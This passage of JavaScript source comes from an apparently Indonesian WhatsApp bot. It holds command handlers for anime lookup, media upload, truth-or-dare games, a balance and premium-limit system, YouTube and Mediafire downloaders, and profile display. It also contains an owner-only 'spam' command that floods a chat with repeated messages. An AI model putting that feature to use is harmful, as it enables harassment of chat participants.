                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
                    let yoooo = await xdev.downloadAndSaveMediaMessage(encmedia)
	                let bodyForm = new FormData();
        	        bodyForm.append('image', fs.createReadStream(yoooo)) 
                    fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
                    .then(async(res) =>{
                    if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
                    let teks = ''
                    if (res.result[0].similarity < 0.92) {
                        teks = '*Low similarity. 🤔*\n\n'
                    }
                    teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
                    sendFileFromUrl(res.result[0].video, video, {quoted: dev, caption: teks})
                    limitAdd(senderNumber, user)
                    })    
                 .catch((err) => {                   
                   setReply(mess.error.api)
                    })
                    } else if (isSticker || isQuotedSticker ) {
                    let encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    let yoooo = await xdev.downloadAndSaveMediaMessage(encmedia)
                    let ran = getRandom('.png')
				  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
			        fs.unlinkSync(yoooo)
			    	if (err) return setReply('Gagal :V')   
	                let bodyForm = new FormData();
        	        bodyForm.append('image', fs.createReadStream(ran)) 
                    fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
                    .then(async(res) =>{
                    if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
                    let teks = ''
                    if (res.result[0].similarity < 0.92) {
                        teks = '*Low similarity. 🤔*\n\n'
                    }
                    teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
                    xdev.sendFileFromUrl(from, res.result[0].video, teks, msg)
                    limitAdd(senderNumber, user)
                    fs.unlinkSync(ran)
                    })
                 .catch((err) => {       
                            setReply(mess.error.api)
                        })
               })
                 } else {
                   setReply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
                }
               }
               break
        
      

        
        case 'tourl': case 'imagetorul': case 'imgtourl': case 'audiotourl': case 'videotourl': case 'stickertourl': case 'stikertourl': case 'tolink':
									
									if (isQuotedAudio) {
setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
										Okelor = await uploadFile1Day(delib)
										teks=`]─ 「 *AUDIO TO URL* 」 ─[

Url : ${Okelor}`
										setReply(teks)
 
										} else if (isQuotedImage) {
											
											setReply(mess.wait)
											bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
											qbc = await upload(delib)
											teks=`─ 「 *IMAGE TO URL* 」 ─

Url : ${qbc}`
											setReply(teks)
											} else if (isQuotedVideo) {
setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
ffff = await uploadFile1Day(delib)
												teks=`]─ 「 *VIDEO TO URL* 」 ─[

Url : ${ffff}`
												setReply(teks)
												} else if (isQuotedSticker) {
													
													setReply(mess.wait)
bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delib = await xdev.downloadMediaMessage(bioij)
													
													vrr = await uploadFile1Day(delib)
													teks=`]─ 「 *STICKER TO URL* 」 ─[

Url : ${vrr}`
													setReply(teks)
												}
											break
											
											
											
											
											
											
											
											
        
        
        
        
        case 'setbio':
        case 'setbiobot':
                                     {
									 if (!isOwner && !dev.key.fromMe) return setReply("Khusus Owner")
									if (args.length < 1) return setReply(`Kirim perintah ${command} nama\n\nContoh : ${command} Paijo`)
									autobio = false
									await xdev.setStatus(q)
									.then((res) => setReply(`Berhasil mengganti status bio ke ${q}`))
									.catch((err) => setReply('waduh error'))
									}
									break
        
        
        
        
        
        
           
           case 'cekbapak': // By Ramlan ID
					const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
					const cek = bapak[Math.floor(Math.random() * bapak.length)]
					xdev.sendMessage(from, cek, text, { quoted: dev })
					break
					
					
					
					case 'truth':
					const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					setReply(`${ttrth}`) 
					break
			case 'dare':
					const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					setReply(`${der}`) 
					break
	     
//******************** 》Limit《 ********************\\
       case 'topbalance':
                      if(!isGroup)return setReply(mess.only.group)
                      xdev.updatePresence(from, Presence.composing)
                      let txot = `*── 「 TOP BALANCE 」 ──*\n\n`
                      let mebn = [];
                      for (let i of user){
                      mebn.push(i.id)
                      let bl = (i.balance)
                      txot += `*ID :* @${i.id}\n➸ Saldo : ${bl}\n\n`
                      }
                      mentions(txot, mebn, true)
                      break
            case 'limit':
            case 'ceklimit': 
            case 'balance': 
            case 'glimit':
                      setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}\nLimit Game : ${cekGLimit(senderNumber, gcount, user)}/${gcount}\nSaldo : Rp ${getBalance(senderNumber, user)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                      break
            case 'buylimit':{
                       if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = Rp1000`)
                       if (q.includes('-')) return setReply(`Jangan menggunakan -`)
                       if (isNaN(q)) return setReply(`Harus berupa angka`)
                       let ane = Number(math(q) * 100)
                       if (getBalance(senderNumber, user) < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
                       kurangBalance(senderNumber, ane, user)
                       giveLimit(senderNumber, math(q), user)
                       setReply(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${getBalance(senderNumber, user).toLocaleString()}\nSisa Limit : ${getLimit(senderNumber, limitCount, user)}/${limitCount}`)
                       }
                       break
    
  case 'buypremium':
  case 'buyprem':
  try{
  if (!q) return setReply(`Kirim perintah *${prefix}buyprem jumlah* \n\nHarga 1 Jam premium = Rp50,000`)
  if (isNaN(q)) return setReply(`Harus berupa angka`)
 ane = Number(math(q) * 50000)
 if (getBalance(senderNumber, user) < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
 kurangBalance(senderNumber, ane, user)
 teks =`${q}h`
_prem.addPremiumUser (sender, teks, premium)         
await setReply(`Sukses add premium`)
await sendButMessage(from, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium selama 1 jam\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
 } catch (err){
 setReply(err)
 }
	break


          
           
           case 'buyglimit':
           case 'buygamelimit':
                       {
                       if(!q)return setReply(`Example : ${prefix + command} 10\n\nHarga 1 limit = Rp750`)
                       const koinPerlimit = 750
                       const total = koinPerlimit * q
                       if (getBalance(senderNumber, user) <= total) return setReply(`Maaf Saldo kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
                       kurangBalance(senderNumber, total, user)
                       givegame(senderNumber, math(q), user)
                       setReply(`Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp${getBalance(senderNumber, user).toLocaleString()}\nSisa Game Limit : ${cekGLimit(senderNumber, gcount, user)}/${gcount}`)
                       }
                       break
          case 'giftlimit':
                       if(!isOwner)return
                       if (!q)return setReply(`Example : ${prefix + command} @tag 10`)
                       lim = q.split(" ")[1]
                       const tag1 = `${q.split(" ")[0].replace("@",'')}`
                       giveLimit(tag1, lim, user)
                       setReply('Succes')
                       break
           
           
           
           
          
                  
            




      
          
        case 'listprem':
        case 'listpremium':

                   let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
                   let men = [];
                   for (let i of premium){
                   men.push(i.id)
                   let cekvip = ms(i.expired - Date.now())
                   txt += `*ID :* ${i.id}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
                   }
                   setReply(txt, men, true)
                   break
                   
                   case 'emoji':
                      if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                      if (args.length == 0) return setReply(`Example: ${prefix + command} wa 🗿

*LIST EMOJI*

code: ap
vendor: Apple
      
code: go
vendor: Google
      
code: sa
vendor: Samsung
      
code: ms
vendor: Microsoft
      
code: wa
vendor: WhatsApp
      
code: tw
vendor: Twitter
      
code: fb
vendor: Facebook
      
code: jp
vendor: JoyPixels
     
code: op
vendor: OpenMoji
      
code: od
vendor: emojidex
      
code: mes
vendor: Messenger
      
code: lg
vendor: logitech
    
code: htc
vendor: HTC
      
code: mo
vendor: Mozilla
      
code: sb
vendor: SoftBank
      
code: dm
vendor: Docomo
      
code: au
vendor: auKDDI

penggunaan : ${prefix + command } wa 🗿`)
                     emojis = args[0]
                     args.shift()
                     emoje = args.join(" ")
                     setReply(mess.wait)
                     limitAdd(senderNumber, user)
                     switch (emojis) {
               case 'ap':
               case 'apple':
			             emoji.get(`${emoje}`).then(emoji => {
				         teks = `${emoji.images[0].url}`
    	         		sendStickerFromUrl(from,`${teks}`)	
             			console.log(teks)
   	  	     		})
                        break
              case 'go':
              case 'google':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[1].url}`
    	   	  	sendStickerFromUrl(from,`${teks}`)	
    	   	  	console.log(teks)
   			  	})
                     break
              case 'sa':
            case 'samsung':
                    emoji.get(`${emoje}`).then(emoji => {
				    teks = `${emoji.images[2].url}`
       	 		sendStickerFromUrl(from,`${teks}`)	
        			console.log(teks)
   	 			})
                   break
            case 'ms':
            case 'microsoft':
                    emoji.get(`${emoje}`).then(emoji => {
				    teks = `${emoji.images[3].url}`
       	 		sendStickerFromUrl(from,`${teks}`)	
        			console.log(teks)
   	 			})
                   break
              case 'wa':
              case 'whatsapp':
                         emoji.get(`${emoje}`).then(emoji => {
				         teks = `${emoji.images[4].url}`
      	       		sendStickerFromUrl(from,`${teks}`)	
    		         	console.log(teks)
   		     	 	})
                         break
                         
               case 'tw':
                  emoji.get(`${emoje}`).then(emoji => {
				  teks = `${emoji.images[5].url}`
    	  		sendStickerFromUrl(from,`${teks}`)	
      			console.log(teks)
   				})
                  break
                  
              case 'fb':
              case 'facebook':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[6].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
               case 'jp':
              case 'joypixel':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[7].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
              case 'om':
              case 'openmoji':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[8].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
               case 'od':
              case 'emojidex':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[9].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
               case 'mes':
              case 'messenger':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[10].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
              case 'lg':
              case 'logitech':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[11].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
             case 'htc':
              
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[12].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
                        
                        
              
           case 'mo':
           case 'mozila':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[13].url}`
    			     sendStickerFromUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break
             
             case 'sb':
           case 'softbank':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[14].url}`
    			     sendStickerFromUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break
           case 'dm':
           case 'docomo':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[15].url}`
    			     sendStickerFromUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break
          case 'au':
           case 'aukddi':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[16].url}`
    			     sendStickerFromUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break            
                   }
                   break
                   
                 


  case 'facebook':
  if(!q) return setReply("Masukan link facebook")
		Fb.getInfo(q).then((info) => console.log(JSON.stringify(info, null, 2)));
		break
                   
                   
                   
                   
           case 'claim':   
           case 'klaim':
              if (checkClaim(senderNumber, _claim)) return setReply(mess.claimOnAlready)
                    var htgm6 = randomNomor(1000)
                    var htgm7 = randomNomor(20)
                    addBalance(senderNumber, htgm6, user)
                    giveLimit(sender, htgm7, user)
                    addUserClaim("1d", timeWib, pushname, senderNumber, _claim)
                    await setReply(`*── 「 CLAIM  」 ──*

Selamat kamu mendapatkan *${htgm7}* Limit & Uang Rp *${htgm6}* 
Dari claim harian`)
                    break
			
			
			
			
			
			
			
			
                   
                   
                   
                   
                   
        case 'cekprem': case 'cekpremium':
                   if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                   let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                   let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
                   try {
                   ppimg = await xdev.getProfilePicture(`${sender.split('@')[0]}@c.us`)
                   } catch {
                   ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                   }
                   teks = `❒ *「 Premium User 」* ❒ 
  
 *Nama : ${pushname}*
 *Tag : @${sender.split("@")[0]}*
 *Expired : ${premiumnya}*`
                    its = await getBuffer (ppimg)
                    xdev.sendMessage(from, its, image, {contextInfo: forward, caption: teks
                     })
                     break
                     
                     
           
           
           
           
           
           
case 'me': 
case 'profile':
case 'myprofile':
try {
ppimg = await xdev.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
stst = await xdev.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
hituser = gethitUser(senderNumber, user)
persenya =`${userPersen}`
nana =`${userExp}/${requiredExp}`
if(isOwner){
	 prmm = isPremium ? `Unlimited`:'Not Premium'
	} else {
      prmm = isPremium ? `${cekprm.days} Hari ${cekprm.hours} Jam ${cekprm.minutes} Menit ${cekprm.seconds} Detik`:'Not Premium'
 }
 
teks = `*]────「 Profile User 」────[*

🆔 Nama : ${pushname} 
💳 Saldo  : Rp ${getBalance(senderNumber, user).toLocaleString()}
✅ Verified : ${userVerified}
📇 Status : ${isPremium ? 'Premium':'Free'}
🧬 Level : ${userLevel}
🔰 Pangkat : ${userLeveling(userLevel)}
⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%
♻️ Total Exp : ${nana}
📟 User Hit : ${hituser}
🤖 Status Bot : ${isOwner ? 'Owner':'User'}
🕔 Expired : ${prmm}
📉 Limit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}
📈 Limit Game : ${cekGLimit(senderNumber, gcount, user)}/${gcount}
📲 No : wa.me/${sender.split("@")[0]}
🧸 Bio : ${stst}`


its = await getBuffer (ppimg)

butprofile = [{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 },{ buttonId: `${prefix}claim`, buttonText: { displayText: `ᴄʟᴀɪᴍ` }, type: 1 } ];         
buttonMessage = {
contentText: teks,
footerText: copyright,
buttons: butprofile,
headerType: 1,
}
xdev.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : `${getBalance(senderNumber, user)}`, status: 1,surface : 2,message: `${pushname}\n${stst}`,orderTitle: `${stst}`,thumbnail: its, sellerJid: `0@s.whatsapp.net`}}}})
break 
           
           
           
           
           
           
           

           

           
           
           
           
           
           
           
          
           
           
           
           
           case 'tekschat':
           if(!q) return reply (`Teksnya mana ?\nContoh : ga ada menu bang`)
           teksChat = `${q}`
           setReply(`
Berhasil mengganti teksChat Bot
jika ada yang command ke bot maka bot
akan menjawab : ${q}`)
       break    
           
           
           
    
    
      
      
           
           
        
                 
              
                 
                
            case 'listbadword':
                let bi = `List badword\n\n`
                for (let boo of badword){
                    bi += `- ${boo}\n`
                }
                bi += `\nTotal : ${badword.length}`
                setReply(bi)
                break
            
           
					
					
					
           
           
          

           
           
           case "listbot":
        let tekss = "「 *LIST JADIBOT* 」\n";
        for (let i of listjadibot1) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        setReply(tekss);
        break;
        



 
 
 
           case 'mediafire': 
                            if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return setReply(mess.limit)
                            if (args.length < 1) return setReply('Link Nya Mana? ')
                            if(!isUrl(args[0]) && !args[0].includes('mediafire')) return setReply(mess.error.Iv)
                            setReply(mess.wait)
                            teks = args.join(' ')
                            res = await mediafireDl(teks)
                            result = `Media Fire Downloader

 *Nama :* ${res[0].nama}
 *Ukuran :* ${res[0].size}
 *Link :* ${res[0].link}

 _*Tunggu Proses Mengirim Media......*_`
                         setReply(result)
                         sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: dev})
                         limitAdd(senderNumber, user)
                         break
           
           
           
           
           
           
					
					
					
					
           case 'kbbi':
					if (args.length < 1) return setReply('Apa yang mau dicari um?')
					asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
					setReply('Menurut Kbbi:\n\n'+asw.result)
					break
           
           
           
                
           
           
           
           
           
          
           
           
           


   
           
        
   
           
           
           

           case "astetick":
    case "videoanime":
    case "storyanime":
    setReply(mess.wait)
     Iki = await getBuffer (`https://megayaa.herokuapp.com/api/randomaesthetic`)
     xdev.sendMessage(from, Iki, video, {quoted: dev })
     break
           
           
           
           
           
           case 'playvideo':
           case 'playvidio':
             if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (!q) return setReply('Judulnya apa kak ?')
            if(q.includes("youtube.com")) return setReply("Judulnya musiknya aja kak")
           // if(!isUrl(args[0]) && !args[0].includes('youtu')) return setReply(mess.error.Iv)
            teks = args.join(' ')
            res = await yts(`${teks}`).catch(e => {
               setReply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
            setReply(mess.wait)
            res = await y2mateV(res.all[0].url).catch(e => {
            setReply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Title : ${res[0].judul}\`\`\`
\`\`\`?? Ext : MP4\`\`\`
\`\`\`🐥 Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: dev}).then((lalu) => {
            sendFileFromUrl(res[0].link, video, {quoted: dev, mimetype: 'video/mp4', filename: res[0].output})
})
            break
           
           
           case 'playaudio':
   if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
  if(q.includes("youtube.com")) return setReply("Judulnya musiknya aja kak")
               if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
               teks = args.join(' ')
               setReply('Tunggu bentar kak')
               
               if (!teks.endsWith("-doc")){
               res = await yts(`${teks}`).catch(e => {
               setReply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
 
               let thumbInfo = `*Youtube Audio Downloader*
               
📜 Judul : ${res.all[0].title}
🎁 Type : mp3
📬 ID : ${res.all[0].videoId}
🌐 Publikasi : ${res.all[0].ago}
🎞️ Ditonton : ${res.all[0].views}
⚖️ Durasi : ${res.all[0].timestamp}
🎥 Channel : ${res.all[0].author.name}
🖇️ Link : ${res.all[0].author.url}


*_Harap tunggu sebentar, file akan segera dikirim_*`

               sendFileFromUrl(res.all[0].image, image, {quoted: dev, thumbnail: Buffer.alloc(0), caption: thumbInfo})
               res = await y2mateA(res.all[0].url).catch(e => {
               setReply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
              
               sendFileFromUrl(res[0].link, audio, {quoted: dev, mimetype: 'audio/mp4', filename: res[0].output})
}
               if (teks.endsWith("-doc")){
               const tec = teks.split("-doc")
               res = await yts(`${tec}`).catch(e => {
               setReply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
        
               let thumbInfo = `*Youtube Audio Downloader*
               
📜 Judul : ${res.all[0].title}
🎁 Type : mp3
?? ID : ${res.all[0].videoId}
🌐 Publikasi : ${res.all[0].ago}
??️ Ditonton : ${res.all[0].views}
⚖️ Durasi : ${res.all[0].timestamp}
🎥 Channel : ${res.all[0].author.name}
🖇️ Link : ${res.all[0].author.url}

*_Harap tunggu sebentar, file akan segera dikirim_*`

               sendFileFromUrl(res.all[0].image, image, {quoted: dev, thumbnail: Buffer.alloc(0), caption: thumbInfo})
               res = await y2mateA(res.all[0].url).catch(e => {
               setReply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
      
               sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'audio/mp3', filename: res[0].output})
}

               break
           
           
           
           
          
case 'ytmp4':
                     if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return setReply(mess.limit)
                     if (args.length === 0) return setReply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			         let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			         if (!isLinks2) return setReply(mess.error.Iv)
                     setReply(mess.wait)
				     try {
				     ytv(args[0])
				    .then((res) => {
				     const { dl_link, thumb, title, filesizeF, filesize } = res
				     axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				    .then((a) => {
				     if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*YT MP4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
				     const captionsYtmp4 = `*Data Successfully Obtained!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Please wait, the media file is being sent it may take a few minutes_`
				     sendMediaURL(from, thumb, captionsYtmp4)
				sendFileFromUrl(dl_link, video, {quoted: dev, mimetype: 'video/mp4'}).catch(() => setReply(mess.Iv)) 
				     limitAdd(senderNumber, user)
				     })		
				     })
				     } catch (err) {
			         setReply(mess.error.Iv)
				     }
				    break






 
           case 'ytmp4hd':
     case 'ythd':
     if (!isPremium && !isOwner && !dev.key.fromMe) return setReply(`Kamu bukan user premium`)
            if (args.length === 0) return setReply(`Kirim perintah */ytmp4 _linkYt_*`)
            let isLinkks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
            if (!isLinkks2) return setReply(mess.error.Iv)
            try {
            setReply(mess.wait)
            ythd(args[0])
           .then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res
            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
           .then((a) => {
            if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Title : ${title}\`\`\`
\`\`\`🐥 Kualitas* : 720p\`\`\`
\`\`\`🐥 Size* : ${filesizeF}\`\`\`
\`\`\`🐥 Link* : ${a.data}\`\`\`

_Untuk durasi lebih dari batas disajikan dalam Bentuk link_`)

            const captionsYtmp4 = 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`?? Title : ${title}\`\`\`
\`\`\`🐥 Kualitas : 720p\`\`\`
\`\`\`🐥 Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

              sendMediaURL(from, thumb, captionsYtmp4)
              sendMediaURL(from, dl_link,`nih kak`).catch(() => setReply(mess.error.api))
})		
})
              } catch (err) {
              setReply(`eror`)
}
              break
           
           
           case 'spam':
				if (!isOwner && !dev.key.fromMe) return setReply(mess.only.ownerB)
					if (!arg) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return setReply('Kebanyakan!')
				if (isNaN(argzi[1])) return setReply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					xdev.sendMessage(from, argzi[0], MessageType.text)
				}
				break
         
           
           
           
     
    

      
           
           
                    
                    
           
           
           
           
           case 'kodebahasa':
